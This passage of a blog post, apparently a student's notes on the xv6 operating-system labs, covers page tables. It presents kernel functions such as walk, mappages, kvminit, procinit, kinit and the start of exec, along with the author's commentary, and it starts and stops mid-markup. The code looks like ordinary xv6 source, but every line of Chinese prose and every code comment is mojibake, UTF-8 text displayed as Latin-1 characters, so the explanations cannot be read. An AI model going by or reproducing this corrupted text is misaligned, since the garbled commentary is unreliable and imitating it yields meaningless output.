class="keyword">while</span>(p-&gt;parent)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state!=UNUSED)&#123;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    p=p-&gt;parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¾—åˆ†"><a href="#å¾—åˆ†" class="headerlink" title="å¾—åˆ†"></a>å¾—åˆ†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 35/35</span><br></pre></td></tr></table></figure>

<h4 id="ç»“è¯­-1"><a href="#ç»“è¯­-1" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>å¯¹ç³»ç»Ÿè°ƒç”¨ç†è§£çš„æ›´æ·±äº†å§ï¼Œä¹‹å‰åªçŸ¥é“å¤§æ¦‚æ€æƒ³ï¼Œç°åœ¨ä¹ŸçŸ¥é“äº†å¦‚ä½•å®ç°çš„ï¼Œä¹Ÿå¯¹xv6çš„ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢æ›´åŠ ç†Ÿæ‚‰ï¼Œä¹Ÿæ›´åŠ äº†è§£äº†xv6çš„æºä»£ç ã€‚</p>
<h2 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3: page tables"></a>Lab3: page tables</h2><h3 id="code-read"><a href="#code-read" class="headerlink" title="code-read"></a>code-read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//walkå‡½æ•°åœ¨è™šæ‹Ÿåœ°å€æœºåˆ¶ä¸­æ˜¯æ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œä»–æœ‰ä¸¤ç§ä½œç”¨ï¼Œå½“allocä¸º0çš„æ—¶å€™walkå‡½æ•°å°±æ˜¯å•çº¯çš„é€šè¿‡é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€æ‰¾åˆ°è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç¬¬ä¸‰çº§é¡µè¡¨å¯¹åº”çš„pteåœ°å€ï¼Œå½“allocä¸º0çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡kallocå®Œæˆå¯¹é¡µè¡¨é¡¹å’Œé¡µè¡¨çš„å¢åŠ ã€‚ä½†ä¸ç®¡allocæ˜¯ä»€ä¹ˆå€¼ï¼Œè¿”å›çš„éƒ½æ˜¯å¯¹åº”çš„pteåœ°å€ï¼Œè€Œä¸æ˜¯å¯¹åº”çš„ç‰©ç†åœ°å€</span></span><br><span class="line"><span class="comment">//å½“ç„¶è¿™ä¸€åˆ‡éƒ½æ˜¯ä¾èµ–äºè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„ç›´æ¥æ˜ å°„ï¼Œä¸ç„¶walkæŸ¥åˆ°çš„é¡µè¡¨åœ°å€ç›´æ¥æ˜¯ç‰©ç†åœ°å€ï¼Œåœ¨æ“ä½œç³»ç»Ÿå±‚é¢æ— æ³•å†å¾€ä¸‹æŸ¥æ‰¾äº†</span></span><br><span class="line">walk(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--) &#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!alloc || (pagetable = (<span class="keyword">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™ä¸ªå‡½æ•°æ˜¯æ¯”è¾ƒå…³é”®çš„è®¾ç½®é¡µè¡¨ï¼Œå¢åŠ é¡µè¡¨é¡¹çš„å‡½æ•°ï¼Œé¦–å…ˆé€šè¿‡è°ƒç”¨walkå‡½æ•°å¾—åˆ°pteçš„åœ°å€ï¼Œç„¶åæŠŠå¯¹åº”çš„paå¡«å…¥é¡µè¡¨é¡¹ï¼Œä¸€ç›´é‡å¤æ“ä½œç›´åˆ°éœ€è¦æ˜ å°„çš„åœ°å€è¢«æ˜ å°„å®Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mappages</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 a, last;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  a = PGROUNDDOWN(va);</span><br><span class="line">  last = PGROUNDDOWN(va + size - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">1</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V)</span><br><span class="line">      panic(<span class="string">&quot;remap&quot;</span>);</span><br><span class="line">    *pte = PA2PTE(pa) | perm | PTE_V;</span><br><span class="line">    <span class="keyword">if</span>(a == last)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a += PGSIZE;</span><br><span class="line">    pa += PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹ä¸Šä¸€ä¸ªå‡½æ•°çš„å°è£…</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ¯”è¾ƒé‡è¦çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦æ˜¯å®Œæˆå¯¹å†…æ ¸é¡µè¡¨çš„æ˜ å°„ï¼Œå‰é¢çš„ä¸€äº›æ˜ å°„å¡ä¸æ‡‚æï¼Œä½†æ˜¯åé¢ä¸‰ä¸ªå°±æ˜¯test,dataä»¥åŠé™·é˜±å¸§çš„æ˜ å°„ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kernel_pagetable = (<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CLINT</span></span><br><span class="line">  kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯»å®Œä»£ç åæ„Ÿè§‰å†…æ ¸å¹¶ä¸æ˜¯ç›´æ¥è¿è¡Œåœ¨ç‰©ç†å†…å­˜ä¸Šçš„ï¼Œä»–ä¹Ÿéµå¾ªè™šæ‹Ÿå†…å­˜ï¼Œæ‰€ä»¥è¦æ§åˆ¶æ•´ä¸ªç‰©ç†å†…å­˜çš„è¯å°±éœ€è¦ä¸€æ®µè™šæ‹Ÿåœ°å€å¯¹æ•´ä¸ªç‰©ç†å†…å­˜è¿›è¡Œæ˜ å°„ï¼Œé€šè¿‡è¿™æ®µè™šæ‹Ÿåœ°å€æ§åˆ¶æ•´ä¸ªç‰©ç†å†…å­˜ã€‚</p>
<h3 id="book-read-3"><a href="#book-read-3" class="headerlink" title="book-read"></a>book-read</h3><h4 id="åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"><a href="#åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´" class="headerlink" title="åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´"></a>åˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´</h4><p>åœ¨å†…æ ¸å¯åŠ¨çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šè°ƒç”¨mainå‡½æ•°ï¼Œmainä¼šè°ƒç”¨ä¸Šè¿°ä»‹ç»çš„<code>kvminit</code>æ¥åˆå§‹åŒ–å†…æ ¸é¡µè¡¨ï¼Œ<code>kvminit</code>å·²ç»åˆ†æè¿‡äº†ï¼Œæ¥ç€çœ‹<code>kvminithart</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(LAB_PGTBL) || defined(LAB_LOCK)</span></span><br><span class="line">    statsinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAB_NET</span></span><br><span class="line">    pci_init();</span><br><span class="line">    sockinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¸€ä¸ªå‡½æ•°è®¾ç½®å¥½å†…æ ¸é¡µè¡¨ä¹‹åï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯è®©<code>satp</code>å¯„å­˜å™¨æŒ‡å‘è¿™ä¸ªé¡µè¡¨ï¼Œåˆ°è¿™é‡Œcpuæ‰å¼€å¯äº†è™šæ‹Ÿå†…å­˜ï¼Œä¹‹å‰å…¨éƒ¨éƒ½æ˜¯ç›´æ¥åœ¨ç‰©ç†å†…å­˜ä¸Šå¹²çš„ã€‚</p>
<p>å½“å¼€å§‹è™šæ‹Ÿåœ°å€ä¹‹å‰ï¼Œpcå¯„å­˜å™¨è®°å½•ç€ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„ç‰©ç†åœ°å€ï¼Œå½“å¼€å¯äº†ä¹‹åï¼Œpcå¯„å­˜å™¨å°±è®°å½•ç€ä¸‹ä¸€ä¸ªæŒ‡ä»¤çš„è™šæ‹Ÿåœ°å€ï¼Œå°±éœ€è¦ç¿»è¯‘äº†ï¼Œä½†ç”±äºxv6æ“ä½œç³»ç»Ÿæ˜¯é‡‡ç”¨ç›´æ¥æ˜ å°„çš„ï¼Œæ‰€ä»¥å¼€äº†å’Œæ²¡å¼€å·®ä¸å¤šâœŒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kvminithart()</span><br><span class="line">&#123;</span><br><span class="line">  w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">  sfence_vma();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆè°ƒç”¨<code>procinit</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°å°±æ˜¯éå†æ‰€æœ‰çš„è¿›ç¨‹çš„procç»“æ„ä½“ï¼Œç„¶ååˆ©ç”¨kallocç”³è¯·ä¸€ä¸ªé¡µè¡¨ï¼Œä¸è¿‡æˆ‘ç¨å¾®æœ‰é—®é¢˜çš„å°±æ˜¯kallocè¿”å›çš„æ˜¯è™šæ‹Ÿåœ°å€ï¼Œè™½è¯´æ˜¯ç›´æ¥æ˜ å°„ï¼Œä½†æ˜¯ä»–ç›´æ¥é»˜è®¤æˆç‰©ç†åœ°å€äº†ï¼Œè¿˜æ˜¯ä¸å¤ªä¸¥è°¨ï¼Œå®¹æ˜“äº§ç”Ÿè¯¯å¯¼ã€‚ç„¶ååˆ©ç”¨<code>KSTACK</code>è®¡ç®—å‡ºè¿™ä¸ªè¿›ç¨‹çš„å†…æ ¸æ ˆçš„è™šæ‹Ÿåœ°å€ï¼Œç„¶åè°ƒç”¨<code>kvmmap</code>è¿›è¡Œæ˜ å°„ã€‚</p>
<p>é€€å‡ºforå¾ªç¯ä¹‹åè¿˜å¾—è°ƒç”¨<code>kvminithart</code>å‡½æ•°ï¼Œå› ä¸ºå·²ç»æ›´æ”¹äº†é¡µè¡¨ï¼Œå°±å¿…é¡»åˆ·æ–°TLBï¼Œä¸ç„¶å¯èƒ½ä¼šæ˜ å°„å‡ºé”™ï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¸­çš„<code>sfence_vma</code>å‡½æ•°è°ƒç”¨ä¼šæ‰§è¡Œ<code>sfence.vma</code>æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±ä¼šåˆ·æ–°TLB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  </span><br><span class="line">  initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line">      <span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line">      <span class="comment">// guard page.</span></span><br><span class="line">      <span class="keyword">char</span> *pa = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">      uint64 va = KSTACK((<span class="keyword">int</span>) (p - proc));</span><br><span class="line">      kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">      p-&gt;kstack = va;</span><br><span class="line">  &#125;</span><br><span class="line">  kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç‰©ç†å†…å­˜åˆ†é…</p>
<p>åˆ†é…å™¨çš„ä»£ç ä¸»è¦é›†ä¸­åœ¨<code>kalloc.c</code>æ–‡ä»¶ä¸­ï¼Œä¹‹å‰å·²ç»åˆ†æè¿‡äº†ï¼Œåœ¨mainå‡½æ•°ä¸­ä¼šè°ƒç”¨<code>kinit</code>å‡½æ•°æ¥åˆå§‹åŒ–åˆ†é…å™¨,çœ‹ç€è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šåœ°ï¼Œå°±æ˜¯æŠŠåœ°å€ç©ºé—´ä¸­ä»å†…æ ¸æœ«å°¾åˆ°<code>PHYSTOP</code>çš„åœ°å€æŒ‰æ¯ä¸€é¡µè¿›è¡Œfree,ç„¶åæ”¾åˆ°<code>freelist</code>ä¸­äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="execä»£ç åˆ†æ"><a href="#execä»£ç åˆ†æ" class="headerlink" title="execä»£ç åˆ†æ"></a>execä»£ç åˆ†æ</h4><p>execå‡½æ•°æ˜¯åˆ›å»ºç”¨æˆ·åœ°å€ç©ºé—´æ—¶ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ä»£ç ä¸­ä¾§é‡å…³æ³¨å¯¹elfæ–‡ä»¶çš„è§£æä»¥åŠå¦‚ä½•åˆ›å»ºè¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚</p>
<p>å‡½æ•°é¦–å…ˆç»è¿‡ä¸€ç³»åˆ—å¤„ç†æŠŠelfå¤´è¯»åˆ°elfå˜é‡ä¸­ï¼Œç„¶åå¯¹é­”æ•°è¿›è¡Œåˆ¤æ–­ï¼Œç„¶åè°ƒç”¨<code>proc_pagetable(p)</code>è¿”å›ä¸ªä¸€ä¸ªæ–°çš„é¡µè¡¨ï¼Œè¿™ä¸ªé¡µè¡¨ä¸­å·²ç»æ˜ å°„äº†è·³æ¿å’Œé™·é˜±å¸§ã€‚ç„¶åå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªforå¾ªç¯æŠŠç¨‹åºè£…è½½åˆ°å†…å­˜ä¸­å¹¶é…ç½®é¡µè¡¨ï¼Œå…¶ä¸­<code>uvmalloc</code>å‡½æ•°å°±æ˜¯ç”³è¯·å†…å­˜é¡µç„¶åé…ç½®é¡µè¡¨ï¼Œç„¶å<code>loadseg</code>å‡½æ•°å°±æ˜¯æŠŠäºŒè¿›åˆ¶ç¨‹åºåŠ è½½åˆ°ç”³è¯·çš„å†…å­˜é¡µä¸­ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œä½†æ˜¯å…·ä½“å¦‚ä½•åŠ è½½elfæ¯ä¸ªæ®µçš„è¿˜æ˜¯çœ‹ä¸å¤ªæ‡‚ã€‚</p>
<p>ä¹‹åå°±æ˜¯è®¾ç½®è¿›ç¨‹çš„æ ˆï¼Œç„¶ååˆå§‹åŒ–äº†æ ˆï¼Œåœ¨é‡Œé¢æ”¾äº†argcå’Œargv,æœ€åè®¾ç½®äº†é™·é˜±å¸§çš„ä¸€äº›ä¸œè¥¿å’Œé¡µè¡¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s, *last;</span><br><span class="line">  <span class="keyword">int</span> i, off;</span><br><span class="line">  uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG+<span class="number">1</span>], stackbase;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span 